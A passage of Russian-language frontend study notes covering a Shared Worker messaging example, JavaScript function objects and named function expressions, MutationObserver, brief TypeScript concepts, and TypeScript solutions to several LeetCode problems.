postMessage(message: any, transfer: Transferable[]): voidonmessage: ((this: Worker, event: MessageEvent) => any) | nullonconnect: ((this: Worker, event: MessageEvent) => any) | null
```

> **Пример использования**

Покажу пример использования Shared Worker: сделаем формочку, где можно будет вбить сообщение и оно появится на странице, и с помощью нашего Worker'a отобразим его сразу на двух страницах(_index1.html_, _index2.html_). Откройте обе странички, чтобы заценить.

Инициализируем наших Shared Worker's в _index1.html, index2.html, где_

_index1.html_

1. Инициализируем Shared Worker, берем его port
    
2. При клике на кнопку Send отправляем в Shared Worker message, с помощью `port.postMessage()`
    
3. Создаем handler`onmessage`, в нем добавляем новую строку в наш контейнер с сообщениями
    

_index2.html_

1. Инициализируем Shared Worker, берем его port
    
2. Создаем handler `onmessage`, в нем добавляем новую строку в наш контейнер с сообщениями (тут не делаем нашей формочки, тут будет только список сообщений)
    

_worker.js_

1. Создаем массив, куда сложим все наши порты — `ports`(эти порты нам нужны, чтобы отправить сообщение сразу во все вкладки/iframe, где используется наш Worker, и отобразить там новое сообщение)
    
2. Создаем handler `onmessage` и отправляем сообщение на все наши `ports`
    
3. Вуаля, получаем на обеих страницах одинаковые `messages`

index1.html

```html
<!DOCTYPE html><html>  <head>    <title>Shared Worker 1</title>  </head>  <body>    <div class="message-container"></div>    <input type="text" class="message-input" />    <button class="send-message-button">Send</button>    <script>      const messageContainer = document.querySelector('.message-container');      const messageInput = document.querySelector('.message-input');      const sendMessageButton = document.querySelector('.send-message-button');      const worker = new SharedWorker('worker.js');      const port = worker.port;      sendMessageButton.addEventListener('click', () => {        const message = messageInput.value;        port.postMessage(message);        messageInput.value = '';      });            port.onmessage = (e) => {        messageContainer.innerHTML += e.data + '<br>';      };    </script>  </body></html>
```

index2.html

```html
<!DOCTYPE html><html>  <head>    <title>Shared Worker 2</title>  </head>  <body>    <div class="message-container"></div>    <script>      const messageContainer = document.querySelector('.message-container');          const worker = new SharedWorker('worker.js');      const port = worker.port;      port.onmessage = (e) => {        messageContainer.innerHTML += e.data + '<br>';      };    </script>  </body></html>
```

worker.js

```
const ports = [];self.onconnect = (event) => {  // Достаем порт с которого подключились и сохраняем его, чтобы потом отправить ему сообщение  const port = event.ports[0];  ports.push(port);  port.onmessage = (e) => {    const message = e.data;    for (const client of ports) {      client.postMessage(`Message: ${message}`);    }  };};
```

> **Убийство Shared Worker**

1. С помощью `worker.close()`
    
2. Когда закрыли все вкладки на которых был использован этот Shared Worker
    

> **Use Cases**

- Все, что связано с обменом данными между вкладками и окнами приложения.
    
- Управление общими ресурсами.
    
- Все тоже самое, что и у Dedicated Workers

##### Service Workers
##### стрелочные функции, function declaration/expression

##### Опциональная цепочка '?.'

##### call/apply/bind

##### Объект функции, NFE

Как мы уже знаем, в JavaScript функция -- это значение.

Каждое значение в JavaScript имеет свой тип. А функция -- это какой тип?

В JavaScript функции -- это объекты.

Можно представить функцию как "объект, который может делать какое-то действие". Функции можно не только вызывать, но и использовать их как обычные объекты: добавлять/удалять свойства, передавать их по ссылке и т.д.


###### Свойство "name"

Объект функции содержит несколько полезных свойств.

Например, имя функции нам доступно как свойство "name":

```js run
function sayHi() {
  alert("Hi");
}

alert(sayHi.name); // sayHi
```

Что довольно забавно, логика назначения `name` весьма умная. Она присваивает корректное имя даже в случае, когда функция создаётся без имени и тут же присваивается, вот так:

```js run
let sayHi = function() {
  alert("Hi");
};

alert(sayHi.name); // sayHi (есть имя!)
```

Это работает даже в случае присваивания значения по умолчанию:

```js run
function f(sayHi = function() {}) {
  alert(sayHi.name); // sayHi (работает!)
}

f();
```

В спецификации это называется "контекстное имя": если функция не имеет name, то JavaScript пытается определить его из контекста.

Также имена имеют и методы объекта:

```js run
let user = {

  sayHi() {
    // ...
  },

  sayBye: function() {
    // ...
  }

}

alert(user.sayHi.name); // sayHi
alert(user.sayBye.name); // sayBye
```

В этом нет никакой магии. Бывает, что корректное имя определить невозможно. В таких случаях свойство name имеет пустое значение. Например:

```js run
// функция объявлена внутри массива
let arr = [function() {}];

alert( arr[0].name ); // <пустая строка>
// здесь отсутствует возможность определить имя, поэтому его нет
```

Впрочем, на практике такое бывает редко, обычно функции имеют `name`.

###### Свойство "length"

Ещё одно встроенное свойство "length" содержит количество параметров функции в её объявлении. Например:

```js run
function f1(a) {}
function f2(a, b) {}
function many(a, b, ...more) {}

alert(f1.length); // 1
alert(f2.length); // 2
alert(many.length); // 2
```

Как мы видим, троеточие, обозначающее "остаточные параметры", здесь как бы "не считается".

Свойство `length` иногда используется для [интроспекций](https://ru.wikipedia.org/wiki/Интроспекция_(программирование)) в функциях, которые работают с другими функциями.

Например, в коде ниже функция `ask` принимает в качестве параметров вопрос `question` и произвольное количество функций-обработчиков ответа `handler`.

Когда пользователь отвечает на вопрос, функция вызывает обработчики. Мы можем передать два типа обработчиков:

- Функцию без аргументов, которая будет вызываться только в случае положительного ответа.
- Функцию с аргументами, которая будет вызываться в обоих случаях и возвращать ответ.

Чтобы вызвать обработчик `handler` правильно, будем проверять свойство `handler.length`.

Идея состоит в том, чтобы иметь простой синтаксис обработчика без аргументов для положительных ответов (наиболее распространённый случай), но также и возможность передавать универсальные обработчики:

```js run
function ask(question, ...handlers) {
  let isYes = confirm(question);

  for(let handler of handlers) {
    if (handler.length == 0) {
      if (isYes) handler();
    } else {
      handler(isYes);
    }
  }

}

// для положительных ответов вызываются оба типа обработчиков
// для отрицательных - только второго типа
ask("Вопрос?", () => alert('Вы ответили да'), result => alert(result));
```

Это частный случай так называемого [Ad-hoc-полиморфизма](https://ru.wikipedia.org/wiki/Полиморфизм_(информатика)#Ad-hoc-полиморфизм) -- обработка аргументов в зависимости от их типа или, как в нашем случае -- от значения `length`. Эта идея имеет применение в библиотеках JavaScript.

###### Пользовательские свойства

Мы также можем добавить свои собственные свойства.

Давайте добавим свойство `counter` для отслеживания общего количества вызовов:

```js run
function sayHi() {
  alert("Hi");

  *!*
  // давайте посчитаем, сколько вызовов мы сделали
  sayHi.counter++;
  */!*
}
sayHi.counter = 0; // начальное значение

sayHi(); // Hi
sayHi(); // Hi

alert( `Вызвана ${sayHi.counter} раза` ); // Вызвана 2 раза
```

```warn header="Свойство не есть переменная"
Свойство функции, назначенное как `sayHi.counter = 0`, не *объявляет* локальную переменную `counter` внутри неё. Другими словами, свойство `counter` и переменная `let counter` - это две независимые вещи.

Мы можем использовать функцию как объект, хранить в ней свойства, но они никак не влияют на её выполнение. Переменные -- это не свойства функции и наоборот. Это два параллельных мира.
```

Иногда свойства функции могут использоваться вместо замыканий. Например, мы можем переписать функцию-счётчик из главы <info:closure>, используя её свойство:

```js run
function makeCounter() {
  // вместо
  // let count = 0

  function counter() {
    return counter.count++;
  };

  counter.count = 0;

  return counter;
}

let counter = makeCounter();
alert( counter() ); // 0
alert( counter() ); // 1
```

Свойство `count` теперь хранится прямо в функции, а не в её внешнем лексическом окружении.

Это хуже или лучше, чем использовать замыкание?

Основное отличие в том, что если значение `count` живёт во внешней переменной, то оно не доступно для внешнего кода. Изменить его могут только вложенные функции. А если оно присвоено как свойство функции, то мы можем его получить:

```js run
function makeCounter() {

  function counter() {
    return counter.count++;
  };

  counter.count = 0;

  return counter;
}

let counter = makeCounter();

*!*
counter.count = 10;
alert( counter() ); // 10
*/!*
```

Поэтому выбор реализации зависит от наших целей.

###### Named Function Expression

Named Function Expression или NFE -- это термин для Function Expression, у которого есть имя.

Например, давайте объявим Function Expression:

```js
let sayHi = function(who) {
  alert(`Hello, ${who}`);
};
```

И присвоим ему имя:

```js
let sayHi = function *!*func*/!*(who) {
  alert(`Hello, ${who}`);
};
```

Чего мы здесь достигли? Какова цель этого дополнительного имени `func`?

Для начала заметим, что функция всё ещё задана как Function Expression. Добавление `"func"` после `function` не превращает объявление в Function Declaration, потому что оно все ещё является частью выражения присваивания.

Добавление такого имени ничего не ломает.

Функция все ещё доступна как `sayHi()`:

```js run
let sayHi = function *!*func*/!*(who) {
  alert(`Hello, ${who}`);
};

sayHi("John"); // Hello, John
```

Есть две важные особенности имени `func`, ради которого оно даётся:

1. Оно позволяет функции ссылаться на себя же.
2. Оно не доступно за пределами функции.

Например, ниже функция `sayHi` вызывает себя с `"Guest"`, если не передан параметр `who`:

```js run
let sayHi = function *!*func*/!*(who) {
  if (who) {
    alert(`Hello, ${who}`);
  } else {
*!*
    func("Guest"); // использует func, чтобы снова вызвать себя же
*/!*
  }
};

sayHi(); // Hello, Guest

// А вот так - не cработает:
func(); // Ошибка, func не определена (недоступна вне функции)
```

Почему мы используем `func`? Почему просто не использовать `sayHi` для вложенного вызова?

Вообще, обычно мы можем так поступить:

```js
let sayHi = function(who) {
  if (who) {
    alert(`Hello, ${who}`);
  } else {
*!*
    sayHi("Guest");
*/!*
  }
};
```

Однако, у этого кода есть проблема, которая заключается в том, что значение `sayHi` может быть изменено. Функция может быть присвоена другой переменной, и тогда код начнёт выдавать ошибки:

```js run
let sayHi = function(who) {
  if (who) {
    alert(`Hello, ${who}`);
  } else {
*!*
    sayHi("Guest"); // Ошибка: sayHi не является функцией
*/!*
  }
};

let welcome = sayHi;
sayHi = null;

welcome(); // Ошибка, вложенный вызов sayHi больше не работает!
```

Так происходит, потому что функция берёт `sayHi` из внешнего лексического окружения. Так как локальная переменная `sayHi` отсутствует, используется внешняя. И на момент вызова эта внешняя `sayHi` равна `null`.

Необязательное имя, которое можно вставить в Function Expression, как раз и призвано решать такого рода проблемы.

Давайте используем его, чтобы исправить наш код:

```js run
let sayHi = function *!*func*/!*(who) {
  if (who) {
    alert(`Hello, ${who}`);
  } else {
*!*
    func("Guest"); // Теперь всё в порядке
*/!*
  }
};

let welcome = sayHi;
sayHi = null;

welcome(); // Hello, Guest (вложенный вызов работает)
```

Теперь всё работает, потому что имя `"func"` локальное и находится внутри функции. Теперь оно взято не снаружи (и недоступно оттуда). Спецификация гарантирует, что оно всегда будет ссылаться на текущую функцию.

Внешний код все ещё содержит переменные `sayHi` и `welcome`, но теперь `func` -- это "внутреннее имя функции", таким образом она может вызвать себя изнутри.

```smart header="Это не работает с Function Declaration"
Трюк с "внутренним" именем, описанный выше, работает только для Function Expression и *не* работает для Function Declaration. Для Function Declaration синтаксис не предусматривает возможность объявить дополнительное "внутреннее" имя.

Зачастую, когда нам нужно надёжное "внутреннее" имя, стоит переписать Function Declaration на Named Function Expression.
```

###### Итого

Функции -- это объекты.

Их свойства:

- `name` -- имя функции. Обычно берётся из объявления функции, но если там нет - JavaScript пытается понять его из контекста.
- `length` -- количество аргументов в объявлении функции. Троеточие ("остаточные параметры") не считается.

Если функция объявлена как Function Expression (вне основного потока кода) и имеет имя, тогда это называется Named Function Expression (Именованным Функциональным Выражением). Это имя может быть использовано для ссылки на себя же, для рекурсивных вызовов и т.п.

Также функции могут содержать дополнительные свойства. Многие известные JavaScript-библиотеки искусно используют эту возможность.

Они создают "основную" функцию и добавляют множество "вспомогательных" функций внутрь первой. Например, библиотека [jQuery](https://jquery.com) создаёт функцию с именем `$`. Библиотека [lodash](https://lodash.com) создаёт функцию `_`, а потом добавляет в неё  `_.clone`, `_.keyBy` и другие свойства (чтобы узнать о ней побольше см. [документацию](https://lodash.com/docs)). Они делают это, чтобы уменьшить засорение глобального пространства имён посредством того, что одна библиотека предоставляет только одну глобальную переменную, уменьшая вероятность конфликта имён.

Таким образом, функция может не только делать что-то сама по себе, но также и предоставлять полезную функциональность через свои свойства.


##### MutationObserver: наблюдатель за изменениями

`MutationObserver` - это встроенный объект, наблюдающий за DOM-элементом и запускающий колбэк в случае изменений.

Сначала мы познакомимся с синтаксисом, а затем разберём примеры использования.

###### Синтаксис

`MutationObserver` очень прост в использовании.

Сначала мы создаём наблюдатель за изменениями с помощью колбэк-функции:

```js
let observer = new MutationObserver(callback);
```

Потом прикрепляем его к DOM-узлу:

```js
observer.observe(node, config);
```

`config` - это объект с булевыми параметрами "на какие изменения реагировать":
- `childList` -- изменения в непосредственных детях `node`,
- `subtree` -- во всех потомках `node`,
- `attributes` -- в атрибутах `node`,
- `attributeFilter` -- массив имён атрибутов, чтобы наблюдать только за выбранными.
- `characterData` -- наблюдать ли за `node.data` (текстовое содержимое),

И ещё пара опций:
- `characterDataOldValue` -- если `true`, будет передавать и старое, и новое значение `node.data` в колбэк (см далее), иначе только новое (также требуется опция `characterData`),
- `attributeOldValue` -- если `true`, будет передавать и старое, и новое значение атрибута в колбэк (см далее), иначе только новое (также требуется опция `attributes`).

Затем, после изменений, выполняется `callback`, в который изменения передаются первым аргументом как список объектов [MutationRecord](https://dom.spec.whatwg.org/#mutationrecord), а сам наблюдатель идёт вторым аргументом.

Объекты [MutationRecord](https://dom.spec.whatwg.org/#mutationrecord) имеют следующие свойства:

- `type` -- тип изменения, один из:
   - `"attributes"` изменён атрибут,
   - `"characterData"` изменены данные `elem.data`, это для текстовых узлов
   - `"childList"` добавлены/удалены дочерние элементы,
- `target` -- где произошло изменение: элемент для `"attributes"`, текстовый узел для `"characterData"` или элемент для `"childList"`,
- `addedNodes/removedNodes`  -- добавленные/удалённые узлы,
- `previousSibling/nextSibling` -- предыдущий или следующий одноуровневый элемент для добавленных/удалённых элементов,
- `attributeName/attributeNamespace` -- имя/пространство имён (для XML) изменённого атрибута,
- `oldValue` -- предыдущее значение, только для изменений атрибута или текста, если включена соответствующая опция `attributeOldValue`/`characterDataOldValue`.

Для примера возьмём `<div>` с атрибутом `contentEditable`. Этот атрибут позволяет нам сфокусироваться на элементе, например, кликнув, и отредактировать содержимое.

```html run untrusted
<div contentEditable id="elem">Отредактируй <b>меня</b>, пожалуйста</div>

<script>
let observer = new MutationObserver(mutationRecords => {
  console.log(mutationRecords); // console.log(изменения)
});

// наблюдать за всем, кроме атрибутов
observer.observe(elem, {
  childList: true, // наблюдать за непосредственными детьми
  subtree: true, // и более глубокими потомками
  characterDataOldValue: true // передавать старое значение в колбэк
});
</script>
```

Теперь, если мы изменим текст внутри `<b>меня</b>`, мы получим единичное изменение:

```js
mutationRecords = [{
  type: "characterData",
  oldValue: "меня",
  target: <text node>,
  // другие свойства пусты
}];
```

Если мы выберем или удалим `<b>меня</b>` полностью, мы получим сразу несколько изменений:

```js
mutationRecords = [{
  type: "childList",
  target: <div#elem>,
  removedNodes: [<b>],
  nextSibling: <text node>,
  previousSibling: <text node>
  // другие свойства пусты
}, {
  type: "characterData"
  target: <text node>
  // ...детали изменений зависят от того, как браузер обрабатывает такое удаление
  // он может соединить два соседних текстовых узла "Отредактируй " и ", пожалуйста" в один узел
  // или может оставить их разными текстовыми узлами
}];
```

Так что, `MutationObserver` позволяет реагировать на любые изменения в DOM-поддереве.

###### Использование для интеграции

Когда это может быть нужно?

Представим ситуацию, когда вы подключаете сторонний скрипт, который добавляет какую-то полезную функциональность на страницу, но при этом делает что-то лишнее, например, показывает рекламу `<div class="ads">Ненужная реклама</div>`.

Разумеется, сторонний скрипт не даёт каких-то механизмов её убрать.

Используя `MutationObserver`, мы можем отследить, когда в нашем DOM появится такой элемент и удалить его. А полезную функциональность оставить. Хотя, конечно, создатели стороннего скрипта вряд ли обрадуются, что вы их полезный скрипт взяли, а рекламу удалили.

Есть и другие ситуации, когда сторонний скрипт добавляет что-то в наш документ, и мы хотели бы отследить, когда это происходит, чтобы адаптировать нашу страницу, динамически поменять какие-то размеры и т.п.

`MutationObserver` для этого как раз отлично подходит.

###### Использование для архитектуры

Есть и ситуации, когда `MutationObserver` хорошо подходит с архитектурной точки зрения.

Представим, что мы создаём сайт о программировании. Естественно, статьи на нём и другие материалы могут содержать фрагменты с исходным кодом.

Такой фрагмент в HTML-разметке выглядит так:
```html
...
<pre class="language-javascript"><code>
  // вот код
  let hello = "world";
</code></pre>
...
```

Также на нашем сайте мы будем использовать JavaScript-библиотеку для подсветки синтаксиса, например [Prism.js](https://prismjs.com/). Вызов метода `Prism.highlightElem(pre)` ищет такие элементы `pre` и добавляет в них стили и теги, которые в итоге дают цветную подсветку синтаксиса, подобно той, которую вы видите в примерах здесь, на этой странице.

Когда конкретно нам вызвать этот метод подсветки? Можно по событию `DOMContentLoaded` или просто внизу страницы написать код, который будет искать все `pre[class*="language"]` и вызывать `Prism.highlightElem` для них:

```js
// выделить все примеры кода на странице
document.querySelectorAll('pre[class*="language"]').forEach(Prism.highlightElem);
```

Пока всё просто, правда? В HTML есть фрагменты кода в `<pre>`, и для них мы включаем подсветку синтаксиса.

Идём дальше. Представим, что мы собираемся динамически подгружать материалы с сервера. Позже в учебнике мы изучим [способы для этого](info:fetch). На данный момент имеет значение только то, что мы получаем HTML-статью с веб-сервера и показываем её по запросу:

```js
let article = /* получить новую статью с сервера */
articleElem.innerHTML = article;
```

HTML подгружённой статьи `article` может содержать примеры кода. Нам нужно вызвать `Prism.highlightElem` для них, чтобы подсветить синтаксис.

**Кто и когда должен вызывать `Prism.highlightElem` для динамически загруженной статьи?**

Мы можем добавить этот вызов к коду, который загружает статью, например, так:

```js
let article = /* получить новую статью с сервера */
articleElem.innerHTML = article;

*!*
let snippets = articleElem.querySelectorAll('pre[class*="language-"]');
snippets.forEach(Prism.highlightElem);
*/!*
```

...Но представьте, что у нас есть много мест в коде, где мы загружаем что-либо: статьи, опросы, посты форума. Нужно ли нам в каждый такой вызов добавлять `Prism.highlightElem`? Получится не очень удобно, да и можно легко забыть сделать это.

А что, если содержимое загружается вообще сторонним кодом? Например, у нас есть форум, написанный другим человеком, загружающий содержимое динамически, и нам захотелось добавить к нему выделение синтаксиса. Никто не любит править чужие скрипты.

К счастью, есть другой вариант.

Мы можем использовать `MutationObserver`, чтобы автоматически определять момент, когда примеры кода появляются на странице, и подсвечивать их.

Тогда вся функциональность для подсветки синтаксиса будет в одном месте, а мы будем избавлены от необходимости интегрировать её.

###### Пример динамической подсветки синтаксиса

Вот работающий пример.

Если вы запустите этот код, он начнёт наблюдать за элементом ниже, подсвечивая код любого примера, который появляется там:

```js run
let observer = new MutationObserver(mutations => {

  for(let mutation of mutations) {
    // проверим новые узлы, есть ли что-то, что надо подсветить?

    for(let node of mutation.addedNodes) {
      // отслеживаем только узлы-элементы, другие (текстовые) пропускаем
      if (!(node instanceof HTMLElement)) continue;

      // проверить, не является ли вставленный элемент примером кода
      if (node.matches('pre[class*="language-"]')) {
        Prism.highlightElement(node);
      }

      // или, может быть, пример кода есть в его поддереве?
      for(let elem of node.querySelectorAll('pre[class*="language-"]')) {
        Prism.highlightElement(elem);
      }
    }
  }

});

let demoElem = document.getElementById('highlight-demo');

observer.observe(demoElem, {childList: true, subtree: true});
```

Ниже находится HTML-элемент и JavaScript, который его динамически заполнит примером кода через `innerHTML`.

Пожалуйста, запустите предыдущий код (он наблюдает за этим элементом), а затем код, расположенный ниже. Вы увидите как `MutationObserver` обнаружит и подсветит фрагменты кода.

<p id="highlight-demo" style="border: 1px solid #ddd">Демо-элемент с <code>id="highlight-demo"</code>, за которым следит код примера выше.</p>

```js run
let demoElem = document.getElementById('highlight-demo');

// динамически вставить содержимое как фрагменты кода
demoElem.innerHTML = `Фрагмент кода ниже:
  <pre class="language-javascript"><code> let hello = "world!"; </code></pre>
  <div>Ещё один:</div>
  <div>
    <pre class="language-css"><code>.class { margin: 5px; } </code></pre>
  </div>
`;
```

Теперь у нас есть `MutationObserver`, который может отслеживать вставку кода в наблюдаемых элементах или во всём документе. Мы можем добавлять/удалять фрагменты кода в HTML, не задумываясь об их подсветке.

###### Дополнительные методы

Метод, останавливающий наблюдение за узлом:

- `observer.disconnect()` -- останавливает наблюдение.

Вместе с ним используют метод:

- `mutationRecords = observer.takeRecords()` -- получает список необработанных записей изменений, которые произошли, но колбэк для них ещё не выполнился.

```js
// мы отключаем наблюдатель
observer.disconnect();

// он, возможно, не успел обработать некоторые изменения
let mutationRecords = observer.takeRecords();
// обработать mutationRecords
```

###### Сборка мусора

Объекты `MutationObserver` используют внутри себя так называемые ["слабые ссылки"](https://ru.wikipedia.org/wiki/%D0%A1%D0%BB%D0%B0%D0%B1%D0%B0%D1%8F_%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D0%B0) на узлы, за которыми смотрят. Так что если узел удалён из DOM и больше не достижим, то он будет удалён из памяти вне зависимости от наличия наблюдателя.


###### Итого

`MutationObserver` может реагировать на изменения в DOM: атрибуты, добавленные/удалённые элементы, текстовое содержимое.

Мы можем использовать его, чтобы отслеживать изменения, производимые другими частями нашего собственного кода, а также интегрироваться со сторонними библиотеками.

`MutationObserver` может отслеживать любые изменения. Разные опции конфигурации "что наблюдать" предназначены для оптимизации, чтобы не тратить ресурсы на лишние вызовы колбэка.

## TS

  
##### **Какие типы данных поддерживает TypeScript?**

  

- **Ответ:** TypeScript поддерживает:

    - Примитивные типы: `string`, `number`, `boolean`, `null`, `undefined`, `symbol`, `bigint`.

    - Сложные типы: `array`, `tuple`, `enum`, `object`, `function`.

    - Специальные типы: `any`, `unknown`, `void`, `never`.

##### interface vs type

- `type` может использоваться для создания псевдонимов для любых типов, включая примитивы, объединения и пересечения.

- `interface` используется только для описания формы объектов и может быть расширен с помощью `extends`.

##### type guards

##### generics

##### union / intersection

- - **Union types (`|`):** Позволяют указать, что переменная может быть одного из нескольких типов.

        typescript

        let value: string | number;

    - **Intersection types (`&`):** Позволяют объединить несколько типов в один.

        typescript

        type A = { a: string };

        type B = { b: number };

        type C = A & B; // { a: string, b: number }

  

---

##### any vs unknown

`any` — это тип, который отключает проверку типов для переменной. Его следует использовать только в крайних случаях, когда тип неизвестен или сложно определить.

`unknown` — это тип, который требует явного приведения перед использованием. В отличие от `any`, он безопаснее, так как не позволяет выполнять операции без проверки типа.

  

##### **абстрактный класс**

Абстрактный класс — это класс, который не может быть инстанциирован напрямую. Он используется как шаблон для других классов и может содержать абстрактные методы (без реализации).

  
  


## React

##### зачем нужен

##### виртуальный ДОМ

##### коммит/рендер

##### состояние

##### useMemo, useCallback, memo

##### useEffect

##### context

  
  

## Алгоритмы

  

О() нотация

массивы

хэш-таблицы

бинарный поиск

сортировка

  

### [125. Valid Palindrome](https://leetcode.com/problems/valid-palindrome/)

```typescript

function isPalindrome(s: string): boolean {

  

  if (s.trim() === "") {

    return true;

  }

  

  let str = "";

  

  const lowerString = s.toLowerCase();

  

  for (let i = 0; i <= lowerString.length - 1; i++) {

    if (

      (lowerString[i] >= "a" && lowerString[i] <= "z") ||

      (lowerString[i] >= "0" && lowerString[i] <= "9")

    ) {

      str += lowerString[i];

    }

  }

  

  let left = 0;

  let right = str.length - 1;

  

  while (left < right) {

    if (str.charCodeAt(left) === str.charCodeAt(right)) {

      left++;

      right--;

    } else {

      return false;

    }

  }

  

  return true;

}

  

```

### [242. Valid Anagram](https://leetcode.com/problems/valid-anagram/)

```typescript

function isAnagram(s: string, t: string): boolean {

    const n = s.length;

    const m = t.length;

  

    if (n !== m) return false;

    const hash = new Map<string, number>();

  

    for (const i of s) {

        const value = hash.get(i) || 0;

        hash.set(i, value + 1);

    }

  

    for (const i of t) {

        const value = hash.get(i) || 0;

        hash.set(i, value - 1);

  

        if (hash.get(i) < 0) {

            return false;

        }

    }

  

    return true;

};

```

### [20. Valid Parentheses](https://leetcode.com/problems/valid-parentheses/)

```typescript

function isValid(s: string): boolean {

    const characters = ['{', '(', '['];

  

    const stack = []

  

    for (let i of s) {

        if (characters.includes(i)) {

            stack.push(i)

        } else {

            if (stack.length > 0) {

                let last = stack.pop()

                if (last === '{' && i !== '}') return false

                if (last === '(' && i !== ')') return false

                if (last === '[' && i !== ']') return false

            } else {

                return false

            }

        }

    }

  

    if (stack.length > 0) return false

  

    return true

};

```

  

### [1. Two Sum](https://leetcode.com/problems/two-sum/)

```typescript

function twoSum(nums: number[], target: number): number[] {

    const map = new Map<number, number>();

  

    for (let i = 0; i < nums.length; i++) {

        let diff = target - nums[i];

        if (map.has(diff)) {

            return [i, map.get(diff)];

        }

        map.set(nums[i], i);

    }

    return [];

};

```

  

### [217. Contains Duplicate](https://leetcode.com/problems/contains-duplicate/)

  

```typescript

function containsDuplicate(nums: number[]): boolean {

    const set = new Set(nums);

  

    return nums.length !== set.size;

};

```

  

```typescript

function containsDuplicate(nums: number[]): boolean {

    const map = new Map<number, boolean>();

  

    for (let num of nums) {

        if (map.has(num)) return true;

        map.set(num, true);

    }

  

    return false;

};

```

  

### [704. Binary Search](https://leetcode.com/problems/binary-search/)

```typescript

function search(nums: number[], target: number): number {

    const n = nums.length;

    let left = 0;

    let right = n - 1;

  

    while (left <= right) {

        let mid = Math.floor((left + right) / 2);

  

        if (nums[mid] === target) {

            return mid;

        } else if (nums[mid] < target) {

            left = mid + 1;

        } else {

            right = mid - 1;

        }

    }

  

    return -1;

};

```